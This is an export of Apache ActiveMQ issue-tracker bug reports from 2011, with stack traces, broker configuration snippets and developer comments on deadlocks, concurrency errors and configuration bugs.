The admin console Queues page shows that the subsequent messages are waiting in the queue but drilling into the queue shows no message.
Restarting ActiveMQ and the Queues page doesn't show any messages.",Windows 7,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14626,,,Mon Apr 18 22:57:14 UTC 2011,,,,,,,,,,,"0|i0b9pr:",63686,,,,,,,,,,,,,,,,,,,,,"08/Apr/11 22:40;tabish;Can you attach a JUnit test case that reproduces this issue?;;;","08/Apr/11 23:02;matt_good@yahoo.com;After restarting ActiveMQ, the messages that I couldn't see get delivered which probably is why none show in the Queues list after the restart.
If I use Time To Wait and Number of Repeats instead of CRON, it works fine.

I don't know how to set up a unit test to test this given the need for a listener and such a long delay.  I used the administration console to create the messages.  A very simple listener will do.;;;","18/Apr/11 22:57;tabish;Fixed in trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Deadlock with static:(failover:(...)) configuration,AMQ-3277,12503781,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,artnaseef,artnaseef,08/Apr/11 21:05,07/Oct/11 13:18,14/Jul/23 05:43,07/Oct/11 13:18,5.4.2,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"Using failover transports with static transports to create a network of brokers with H/A pairs, the failovers lead to deadlocks.

This appears related to AMQ-3176, but the patch for that problem is included in our 5.4.2 build.

                <networkConnector name=""nw1_from_nw2"" uri=""static:(failover:(tcp://127.0.0.1:60992,tcp://127.0.0.1:60002))""
                                  duplex=""true"" conduitSubscriptions=""false"" dynamicOnly=""true""
                                  networkTTL=""7"" suppressDuplicateQueueSubscriptions=""true""
                                  decreaseNetworkConsumerPriority=""true""

                                  bridgeTempDestinations=""true""
                                  >
                </networkConnector>

The deadlock occurs after stopping and restarting each broker once.  Here's the steps:

    - start broker1
    - start broker2
    * test connectivity
    - sthudown broker1
    - restart broker1
    * test connectivity
    - shutdown broker2
    - restart broker2
    * test connectivity

Here is the deadlock information from the JVM:

Java stack information for the threads listed above:
===================================================
""StartRemotelBridge: localBroker=vm://peer-nw2#2"":
        at org.apache.activemq.transport.failover.FailoverTransport.oneway(FailoverTransport.java:477)
        - waiting to lock <0x00002aaac2df83c8> (a java.lang.Object)
        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40)
        - locked <0x00002aaac2e050f8> (a java.lang.Object)
        at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60)
        at org.apache.activemq.network.DemandForwardingBridgeSupport.startRemoteBridge(DemandForwardingBridgeSupport.java:352)
        - locked <0x00002aaac2df7c50> (a org.apache.activemq.network.DurableConduitBridge)
        at org.apache.activemq.network.DemandForwardingBridgeSupport$4.run(DemandForwardingBridgeSupport.java:277)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
        at java.lang.Thread.run(Thread.java:662)
""ActiveMQ Failover Worker: 169776139"":
        at org.apache.activemq.network.DemandForwardingBridgeSupport.startLocalBridge(DemandForwardingBridgeSupport.java:290)
        - waiting to lock <0x00002aaac2df7c50> (a org.apache.activemq.networFound one Java-level deadlock:
=============================
""StartRemotelBridge: localBroker=vm://peer-nw2#2"":
  waiting to lock monitor 0x0000000044796938 (object 0x00002aaac2df83c8, a java.lang.Object),
  which is held by ""ActiveMQ Failover Worker: 169776139""
""ActiveMQ Failover Worker: 169776139"":
  waiting to lock monitor 0x00002aaac470f0b0 (object 0x00002aaac2df7c50, a org.apache.activemq.network.DurableConduitBridge),
  which is held by k.DurableConduitBridge)
        at org.apache.activemq.network.DemandForwardingBridgeSupport$2.transportResumed(DemandForwardingBridgeSupport.java:220)
        at org.apache.activemq.transport.TransportFilter.transportResumed(TransportFilter.java:109)
        at org.apache.activemq.transport.TransportFilter.transportResumed(TransportFilter.java:109)
        at org.apache.activemq.transport.failover.FailoverTransport.doReconnect(FailoverTransport.java:870)
        - locked <0x00002aaac2df83c8> (a java.lang.Object)
        at org.apache.activemq.transport.failover.FailoverTransport$2.iterate(FailoverTransport.java:135)
        - locked <0x00002aaac2df83d8> (a java.lang.Object)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:98)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

Found 1 deadlock.
","5.4.2 with back-ported patches for AMQ-3176, AMQ-2736, AMQ-3124, AMQ-3125, AMQ-3167.

Two brokers, each with a single duplex network connection to the other, using static:(failover:(first,second)) URI format.",artnaseef,asussman,scranton,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/May/11 20:49;artnaseef;singleTransport.patch;https://issues.apache.org/jira/secure/attachment/12480164/singleTransport.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,50039,,,Fri Oct 07 13:18:30 UTC 2011,,,,,,,,,,,"0|i0ajjb:",59438,,,,,,,,,,,,,,,,,,,,,"08/Apr/11 21:10;artnaseef;Re-pasting the deadlock information; it was garbled in the last copy-and-paste.

Found one Java-level deadlock:
=============================
""StartRemotelBridge: localBroker=vm://peer-nw2#2"":
  waiting to lock monitor 0x0000000044796938 (object 0x00002aaac2df83c8, a java.lang.Object),
  which is held by ""ActiveMQ Failover Worker: 169776139""
""ActiveMQ Failover Worker: 169776139"":
  waiting to lock monitor 0x00002aaac470f0b0 (object 0x00002aaac2df7c50, a org.apache.activemq.network.DurableConduitBridge),
  which is held by ""StartRemotelBridge: localBroker=vm://peer-nw2#2""

Java stack information for the threads listed above:
===================================================
""StartRemotelBridge: localBroker=vm://peer-nw2#2"":
        at org.apache.activemq.transport.failover.FailoverTransport.oneway(FailoverTransport.java:477)
        - waiting to lock <0x00002aaac2df83c8> (a java.lang.Object)
        at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40)
        - locked <0x00002aaac2e050f8> (a java.lang.Object)
        at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60)
        at org.apache.activemq.network.DemandForwardingBridgeSupport.startRemoteBridge(DemandForwardingBridgeSupport.java:352)
        - locked <0x00002aaac2df7c50> (a org.apache.activemq.network.DurableConduitBridge)
        at org.apache.activemq.network.DemandForwardingBridgeSupport$4.run(DemandForwardingBridgeSupport.java:277)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
        at java.lang.Thread.run(Thread.java:662)
""ActiveMQ Failover Worker: 169776139"":
        at org.apache.activemq.network.DemandForwardingBridgeSupport.startLocalBridge(DemandForwardingBridgeSupport.java:290)
        - waiting to lock <0x00002aaac2df7c50> (a org.apache.activemq.network.DurableConduitBridge)
        at org.apache.activemq.network.DemandForwardingBridgeSupport$2.transportResumed(DemandForwardingBridgeSupport.java:220)
        at org.apache.activemq.transport.TransportFilter.transportResumed(TransportFilter.java:109)
        at org.apache.activemq.transport.TransportFilter.transportResumed(TransportFilter.java:109)
        at org.apache.activemq.transport.failover.FailoverTransport.doReconnect(FailoverTransport.java:870)
        - locked <0x00002aaac2df83c8> (a java.lang.Object)
        at org.apache.activemq.transport.failover.FailoverTransport$2.iterate(FailoverTransport.java:135)
        - locked <0x00002aaac2df83d8> (a java.lang.Object)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:98)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

Found 1 deadlock.
;;;","23/May/11 20:49;artnaseef;Patch which creates a new transport ""single"".  This transport connects to the first composite URL in its list and returns that connection, failing if none connect.

It has no failover features.

Used with NetworkConnectors, this transport operates well with NetworkConnectors since the network bridges are automatically recreated as-needed.  It appears the redundancy - reconnection at the network bridge level and at the failover transport level - may have lead to the deadlock.;;;","23/May/11 20:51;artnaseef;To use this new transport, just change ""failover"" to ""single"".  Here's an example for use in a NetworkConnector:

static:(single:(ssl://broker1.node1.bus:61616,ssl://broker2.node1.bus:61616))
;;;","24/May/11 10:14;gtully;Using failover: with a network connector is limited to choosing one of the composite urls to connect to. It should no be used to implement failover of the transport because the network connector handles failover itself.
To achieve what arthur describes as ""single"" transport, the maxReconnectAttempts=1 url parameter must be used in the failover url so that it will report a transport failure back to the networkConnector such that it can initiate a recreation of the bridge.
{code}<networkConnector uri=""static:(failover:(tcp://xxx:32258,tcp://yyy:32259)?randomize=false&amp;maxReconnectAttempts=1)""/>{code}
see: https://issues.apache.org/jira/browse/AMQ-3222 ;;;","24/May/11 15:43;artnaseef;I will test with Failover using maxReconnectAttempts=1 and post an update.  Thank you.;;;","07/Oct/11 13:18;gtully;maxReconnectAttempts=1 on the failover uri sorts this.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ConcurrentModificationException in embedded 5.5.0 broker,AMQ-3276,12503739,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,dcheckoway,dcheckoway,08/Apr/11 13:47,20/Sep/11 10:42,14/Jul/23 05:43,08/Apr/11 16:21,5.5.0,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"We just migrated from ActiveMQ 5.4.2 to ActiveMQ 5.5.0.  So far so good, with one exception (pun not intended).  In one case where we have an embedded broker, we're seeing this exception get logged on occasion:

WARNING; 08-Apr-2011 11:11:41; tid:45931; TransportConnection stopAsync; cannot create async transport stopper thread.. not waiting for stop to complete, reason:
java.util.ConcurrentModificationException
        at java.util.HashMap$HashIterator.nextEntry(HashMap.java:793)
        at java.util.HashMap$EntryIterator.next(HashMap.java:834)
        at java.util.HashMap$EntryIterator.next(HashMap.java:832)
        at java.util.HashMap.putAllForCreate(HashMap.java:435)
        at java.util.HashMap.<init>(HashMap.java:225)
        at org.slf4j.helpers.BasicMDCAdapter.getCopyOfContextMap(BasicMDCAdapter.java:130)
        at org.slf4j.MDC.getCopyOfContextMap(MDC.java:182)
        at org.apache.activemq.util.MDCHelper.getCopyOfContextMap(MDCHelper.java:30)
        at org.apache.activemq.broker.TransportConnection.stopAsync(TransportConnection.java:946)
        at org.apache.activemq.broker.TransportConnection.processShutdown(TransportConnection.java:353)
        at org.apache.activemq.command.ShutdownInfo.visit(ShutdownInfo.java:35)
        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:306)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:179)
        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
        at org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:218)
        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:127)
        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:48)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
        at java.lang.Thread.run(Thread.java:662)

Up until this morning, I had only seen that logged during shutdown of the app context.  But just now, it popped out independently, out of the blue.

For what it's worth, here's the app context config:

 
  <broker xmlns=""http://activemq.apache.org/schema/core""
          id=""embeddedActivemqBroker""
          useJmx=""true""
          persistent=""true""
          schedulerSupport=""false""
          advisorySupport=""false""
          enableStatistics=""true"">
    <destinationPolicy>
      <policyMap>
        <policyEntries>
          <policyEntry queue="">"" producerFlowControl=""false"" memoryLimit=""20mb""/>
        </policyEntries>
      </policyMap>
    </destinationPolicy>
    <persistenceAdapter>
      <kahaDB directory=""${EmbeddedBroker.dataDirectory}""
              concurrentStoreAndDispatchQueues=""false""/>
    </persistenceAdapter>
  </broker>

Has anybody else seen this ConcurrentModificationException happening with 5.5.0 (or otherwise)?  Any ideas?

I suppose I should also mention that we're using slf4j 1.6.1.  Not sure if that has anything to do with this, since the stack trace does show it happening in slf4j land...

    <dependency>
      <groupId>org.slf4j</groupId>
      <artifactId>slf4j-api</artifactId>
      <version>1.6.1</version>
      <scope>runtime</scope>
    </dependency>
    <dependency>
      <groupId>org.slf4j</groupId>
      <artifactId>slf4j-jdk14</artifactId>
      <version>1.6.1</version>
      <scope>runtime</scope>
    </dependency> ","jdk 1.6.0_24, Spring 3.0.5, ActiveMQ 5.5.0, Camel 2.7.0, slf4j 1.6.1",famod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14624,,,Tue Aug 16 13:31:36 UTC 2011,,,,,,,,,,,"0|i0ajjj:",59439,,,,,,,,,,,,,,,,,,,,,"08/Apr/11 16:21;gtully;reverted the explicit copy/set of the MDC context on thread creation as the underlying mdc impl used an inherited thread local for the context which makes the copy unnecessary and can cause contention. 
the changes in http://svn.apache.org/viewvc?view=revision&revision=1090320 should resolve the concurrent mod exception. I kicked off a new 5.6-SNAPSHOT deploy so if you get a chance please validate.;;;","08/Apr/11 17:30;dcheckoway;Thanks for the very quick turnaround, Gary.  Unfortnately, the only place we've seen this issue is in our loaded production environment.  SNAPSHOTs are all but off limits, sad to say.

I'm guessing 5.6.0 will be a while?  Do you think there will be a 5.5.1 release in the near term?;;;","08/Apr/11 20:59;dkulp;
Just a note that while testing CXF with 5.5.0, I also run into this occasionally.   The CXF test suite will need to remain on 5.4.2 for now.;;;","13/May/11 09:03;famod;Dan Checkoway wrote:
""I'm guessing 5.6.0 will be a while? Do you think there will be a 5.5.1 release in the near term?""

Same questions here!;;;","16/Aug/11 13:30;hondong;Hi, have a look at Fuse 5.5.0 00.43: http://fusesource.com/wiki/display/ProdInfo/FUSE+Message+Broker+v5.5.0-fuse+Release+Notes
This Issue seems to be fixed there.;;;","16/Aug/11 13:31;hondong;You can download it here: http://repo.fusesource.com/nexus/content/repositories/releases/org/apache/activemq/apache-activemq/5.5.0-fuse-00-43/
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Make UDP protocol work,AMQ-3275,12503609,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,dejanb,dejanb,07/Apr/11 08:38,20/Sep/11 10:42,14/Jul/23 05:43,07/Apr/11 13:02,5.5.0,,,,,5.6.0,,,,,,,0,,,,,,,,,"{code}factory = new ActiveMQConnectionFactory(""udp://localhost:61618"");
connection = factory.createConnection();
connection.start();{code}

Connection.start() seems to trigger an infinite loop in ReliableTransport.request(Object).",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14619,,,Thu Apr 07 13:02:56 UTC 2011,,,,,,,,,,,"0|i0ajjr:",59440,,,,,,,,,,,,,,,,,,,,,"07/Apr/11 13:02;dejanb;Fixed with svn revision 1089864;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
duplicate messages on Temporary Topics in network of brokers,AMQ-3274,12503568,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,rajdavies,artnaseef,artnaseef,06/Apr/11 23:14,16/Apr/12 06:23,14/Jul/23 05:43,16/Apr/12 06:23,5.4.2,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"Creating a network of brokers, duplicate messages are being seen on Temporary Topics.

The network configuration used is as follows:

        <networkConnectors>
                <networkConnector name=""nw1_queues_from_nw2"" uri=""static:(tcp://127.0.0.1:60002)""
                                  duplex=""true"" conduitSubscriptions=""false"" dynamicOnly=""true""
                                  networkTTL=""7"" suppressDuplicateQueueSubscriptions=""true""
                                  decreaseNetworkConsumerPriority=""true""

                                  bridgeTempDestinations=""true""
                                  >
                        <excludedDestinations>
                                <topic physicalName="">"" />
                        </excludedDestinations>
                </networkConnector>

                <networkConnector name=""nw1_topics_from_nw2"" uri=""static:(tcp://127.0.0.1:60002)""
                                  duplex=""true"" conduitSubscriptions=""true"" dynamicOnly=""true""
                                  networkTTL=""7"" suppressDuplicateQueueSubscriptions=""true""
                                  decreaseNetworkConsumerPriority=""true""

                                  bridgeTempDestinations=""true""
                                  >
                        <excludedDestinations>
                                <queue physicalName="">"" />
                        </excludedDestinations>
                </networkConnector>
    </networkConnectors>

Note there are 2 duplex connections between the brokers.  Changing to non-duplex connections, the problem goes away with 2 brokers in the network, but reappears when a 3rd broker is added.

The problem only affects temporary Topics; normal Topics work fine.

A patch will be attached.  Also, a test case will be attached when it is available.
",,artnaseef,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/Apr/11 17:25;artnaseef;AMQ3274Test.java;https://issues.apache.org/jira/secure/attachment/12475729/AMQ3274Test.java","06/Apr/11 23:16;artnaseef;tempTopicDups.patch;https://issues.apache.org/jira/secure/attachment/12475641/tempTopicDups.patch",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74706,,,Mon Apr 16 06:23:50 UTC 2012,,,,,,,Patch Available,,,,"0|i0ajjz:",59441,,,,,,,,,,,,,,,,,,,,,"06/Apr/11 23:16;artnaseef;Patch eliminating duplicates on temporary topics.  As the patch shows, subscriptions to temporary destinations were being matched against the subscriptions in permanent regions, not the temp regions.;;;","07/Apr/11 17:25;artnaseef;JUnit test which demonstrates the duplicates. Uses an ""echo"" service and tests Topics, Queues, Temporary Topics, and Temporary Queues.;;;","31/Jan/12 22:55;artnaseef;This is a relatively small change to fix the problem and I have provided a JUnit test case.  Is there anything more I can do to help resolve it?

Note that I just checked the sources on the head (snapshot taken 01/12/2012), and the problem remains there.;;;","16/Apr/12 06:23;rajdavies;Fixed by SVN revision 1326502;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Slave broker acquires lock file when Master is still alive (shared file system master/slave setup),AMQ-3273,12503522,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,dejanb,daroo,daroo,06/Apr/11 15:03,20/Sep/11 10:41,14/Jul/23 05:43,07/Apr/11 08:31,5.5.0,,,,,5.6.0,,,Message Store,,,,0,,,,,,,,,"The change introduced in AMQ-3237 has triggered issue with LockFile.lock() on Win7 and Win2k8. See comments to the JRE issue http://bugs.sun.com/view_bug.do?bug_id=6628575 (bottom of the page).  

Suggested solution is to use this construction instead:
fc.lock( 0, Math.max( 1, fc.size() ), false );
","Windows 7, Windows Server 2008 ",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"06/Apr/11 15:04;daroo;LockFile.java.patch;https://issues.apache.org/jira/secure/attachment/12475592/LockFile.java.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14623,,,Mon Aug 08 06:25:30 UTC 2011,,,,,,,Patch Available,,,,"0|i0ajk7:",59442,,,,,,,,,,,,,,,,,,,,,"07/Apr/11 08:31;dejanb;Patch applied with svn revision 1089772. Thanks!;;;","28/Jun/11 17:12;boday;someone should add a warning to this page (http://activemq.apache.org/shared-file-system-master-slave.html) to let people know this is an issue in version 5.5.0 (since its the latest release)...

also, when will 5.6 be released?
;;;","08/Aug/11 06:25;computerpunk;I encountered a similar problem but the problem happens upon startup. I would like to know if it is due to the same problem cause. I have logged an issue [AMQ-3432] Slave broker able to start together with Master broker (shared file system master/slave setup). Can anyone familiar with this issue enlighten me on whether the two issues (this issue and AMQ-3432) are the same?

Thank you very much.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Handle RejectedExecutionException ,AMQ-3272,12503500,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,dejanb,dejanb,06/Apr/11 10:25,20/Sep/11 10:42,14/Jul/23 05:43,11/May/11 18:45,5.5.0,,,,,5.6.0,,,,,,,0,kahaDB,queue,,,,,,,"Under heavy load, the async task executor in kahadb can throw RejectedExecutionException meaning it can't accept more tasks.

Thread pool executor has RejectedExecutionHandler that deals with these situations and by default it aborts the task and throws the exception. I think it's much better to use ThreadPoolExecutor.CallerRunsPolicy which will try to execute the task in the current thread and thus sync the execution.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14645,,,Thu May 12 10:36:46 UTC 2011,,,,,,,,,,,"0|i0agvz:",59009,,,,,,,,,,,,,,,,,,,,,"07/Apr/11 09:24;gtully;just at thought, this might effect the send order, in that the last task gets executed ahead of pending tasks.
Would it be better if that send blocked pending the execution of the tasks ahead of it.
so use a fixed size blocking task pool and have the number of workers configurable.;;;","08/Apr/11 10:50;dejanb;Should be fixed with svn revision 1090186.

The problem that exception occurred in the first place was the semaphore lock releasing at the end of the task, leaving the small window when executor could accept new tasks while there's no space available. With this fixed, the exception shouldn't happen even under high load.;;;","11/May/11 18:36;gtully;The rejected execution exception still occurs, problem seems to be early release of locks in the cancel case.;;;","11/May/11 18:45;gtully;fix is in http://svn.apache.org/viewvc?rev=1102014&view=rev

when an async task was canceled the semaphore bounding the task queue was signaled in error. That should only be signaled when the task has completed, due to the preceding cancel it will have nothing to do, but it consumes space in the task queue.;;;","12/May/11 10:36;gtully;aborting the task is really a bug as a semaphore is engaged to gate the task queue.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ACTIVEMQ_OPTS_MEMORY is ignored,AMQ-3269,12503389,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,dejanb,jmkgreen,jmkgreen,05/Apr/11 11:04,20/Sep/11 10:41,14/Jul/23 05:43,05/Apr/11 11:22,5.5.0,,,,,5.6.0,,,,,,,0,,,,,,,,,"I have just realised that my brokers were running with 256M of ram, which given they used to operate on 512M raised concerns. Checking my /etc/default/activemq file I do have:
ACTIVEMQ_OPTS_MEMORY=""-Xms512M -Xmx512M""

If I echo out the result of ACTIVEMQ_OPTS within the init.d script (linked to /opt/activemq/bin/activemq) I see only the default 256M resolved.

Only way I was able to up the limit was by editing the init script and replacing the default value with my own.

Marking this as a regression as I am 99% sure this was working in 5.4.x.
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14621,,,Tue Apr 05 11:43:28 UTC 2011,,,,,,,,,,,"0|i0ajkf:",59443,Regression,,,,,,,,,,,,,,,,,,,,"05/Apr/11 11:22;dejanb;Fixed with svn revision 1088979.

It seems to me it didn't work on 5.4.2 either, but never mind.;;;","05/Apr/11 11:43;dejanb;One more fix available in svn revision 1088989

After a closer look (thanks Gary) the problem is that ACTIVEMQ_OPTS were set before we loaded config files. That's fixed now.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Browser closed while iterating changes message delivery order,AMQ-3262,12503279,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,04/Apr/11 12:20,20/Sep/11 10:42,14/Jul/23 05:43,04/Apr/11 12:27,5.5.0,,,,,5.6.0,,,,,,,0,,,,,,,,,"When you close the queue browser before you iterated through all messages, it will mark those unbrowsed messages as not consumed and they will be dispatched first to the next consumer.

This changes the original delivery order of messages.

Message browser should not change message delivery order in any way.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14613,,,Mon Apr 04 12:27:50 UTC 2011,,,,,,,,,,,"0|i0ajl3:",59446,,,,,,,,,,,,,,,,,,,,,"04/Apr/11 12:27;dejanb;Fixed in svn revision 1088593;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
setup writes incorrect jmx port,AMQ-3261,12503269,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,jmkgreen,jmkgreen,04/Apr/11 10:27,01/Nov/12 14:50,14/Jul/23 05:43,01/Nov/12 14:50,5.5.0,,,,,5.8.0,,,JMX,,,,0,,,,,,,,,"See http://activemq.2283324.n4.nabble.com/Setup-writes-wrong-default-JMX-port-td3425002.html for the question and request for JIRA issue.

Change the line:
ACTIVEMQ_SUNJMX_START=""-Dcom.sun.management.jmxremote.port=11099 ""
to
ACTIVEMQ_SUNJMX_START=""-Dcom.sun.management.jmxremote.port=1099 ""
Then remove the ""--jmxurl
service:jmx:rmi:///jndi/rmi://127.0.0.1:11099/jmxrmi "" from the ACTIVEMQ_SUNJMX_CONTROL to make restarts and queries work without erroring.
